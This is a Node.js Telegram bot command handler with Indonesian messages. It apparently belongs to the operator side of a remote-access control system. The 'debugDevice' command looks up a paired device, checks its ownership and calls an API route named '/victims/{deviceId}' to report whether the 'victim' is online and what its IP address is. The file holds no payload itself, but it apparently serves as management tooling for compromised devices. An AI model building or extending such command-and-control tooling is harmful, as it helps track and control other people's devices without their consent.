const axios = require('axios');
const main = require('../index');

const API_URL = process.env.API_URL || 'http://localhost:3000/api';

exports.debugDevice = async (msg) => {
    const chatId = msg.chat.id;

    main.requireAuth(chatId, async (isAuth, errorMsg, user) => {
        if (!isAuth) {
            return main.bot.sendMessage(chatId, errorMsg);
        }

        main.bot.sendMessage(chatId, "Kirim device_id yang ingin di-debug:");

        main.bot.once('message', async (response) => {
            const deviceId = response.text.trim();

            // Check database
            main.db.query(
                'SELECT * FROM devices WHERE device_id = ?',
                [deviceId],
                async (err, dbResult) => {
                    if (err) {
                        return main.bot.sendMessage(chatId, "❌ Database error!");
                    }

                    let debugInfo = `🔍 <b>DEBUG INFO</b>\n\n`;
                    debugInfo += `<b>Your Chat ID:</b> <code>${chatId}</code>\n`;
                    debugInfo += `<b>Device ID:</b> <code>${deviceId}</code>\n\n`;

                    if (dbResult.length === 0) {
                        debugInfo += `❌ <b>Device NOT FOUND in database!</b>\n\n`;
                        debugInfo += `Kemungkinan:\n`;
                        debugInfo += `1. Device belum di-pair\n`;
                        debugInfo += `2. Device ID salah\n`;
                        debugInfo += `3. Gunakan /pair untuk pairing ulang`;
                    } else {
                        const device = dbResult[0];
                        debugInfo += `✅ <b>Device found in database</b>\n\n`;
                        debugInfo += `<b>Device Name:</b> ${device.device_name || 'N/A'}\n`;
                        debugInfo += `<b>Owner Telegram ID:</b> <code>${device.telegram_id}</code>\n`;
                        debugInfo += `<b>Status:</b> ${device.status}\n`;
                        debugInfo += `<b>Paired At:</b> ${device.paired_at}\n`;
                        debugInfo += `<b>Last Active:</b> ${device.last_active || 'Never'}\n\n`;

                        // Check if ownership matches
                        if (device.telegram_id == chatId) {
                            debugInfo += `✅ <b>Ownership: MATCH</b>\n\n`;
                        } else {
                            debugInfo += `❌ <b>Ownership: MISMATCH!</b>\n`;
                            debugInfo += `Expected: <code>${chatId}</code>\n`;
                            debugInfo += `Got: <code>${device.telegram_id}</code>\n\n`;
                            debugInfo += `⚠️ Device ini bukan milik kamu!\n`;
                        }

                        // Check if device is online
                        try {
                            const apiResponse = await axios.get(`${API_URL}/victims/${deviceId}`, {
                                params: { telegram_id: chatId }
                            });
                            debugInfo += `✅ <b>Device is ONLINE</b>\n`;
                            debugInfo += `IP: ${apiResponse.data.victim.ip}`;
                        } catch (apiError) {
                            if (apiError.response?.status === 404) {
                                debugInfo += `❌ <b>Device is OFFLINE</b>\n`;
                                debugInfo += `Device tidak terhubung ke server`;
                            } else if (apiError.response?.status === 403) {
                                debugInfo += `❌ <b>Access Denied</b>\n`;
                                debugInfo += `Ownership verification failed`;
                            }
                        }
                    }

                    main.bot.sendMessage(chatId, debugInfo, { parse_mode: "HTML" });
                }
            );
        });
    });
};